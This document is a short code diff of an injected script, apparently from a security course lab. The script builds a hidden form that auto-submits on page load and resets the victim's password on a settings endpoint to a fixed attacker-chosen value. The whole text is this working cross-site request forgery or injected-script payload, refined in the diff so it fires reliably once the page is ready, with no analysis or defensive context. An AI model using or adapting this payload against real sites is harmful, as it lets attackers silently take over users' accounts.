@@ -1,18 +1,25 @@
 <script>
-    console.log('v9182398');
-    var form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'https://cats.is-course.ru/settings';
-    form.target = 'responseFrame';
-    form.style.display = 'none';
-    var pass1 = document.createElement('input');
-    pass1.name = 'password';
-    pass1.value = 'Abcdef_1234567';
-    var pass2 = document.createElement('input');
-    pass2.name = 'confirm-password';
-    pass2.value = 'Abcdef_1234567';
-    form.appendChild(pass1);
-    form.appendChild(pass2);
-    document.body.appendChild(form);
-    form.submit();
+    console.log('v777');
+    if(document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
+    function init() {
+        var form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://cats.is-course.ru/settings';
+        form.target = 'responseFrame';
+        form.style.display = 'none';
+        var pass1 = document.createElement('input');
+        pass1.name = 'password';
+        pass1.value = 'Abcdef_1234567';
+        var pass2 = document.createElement('input');
+        pass2.name = 'confirm-password';
+        pass2.value = 'Abcdef_1234567';
+        form.appendChild(pass1);
+        form.appendChild(pass2);
+        document.body.appendChild(form);
+        form.submit();
+    }
 </script>
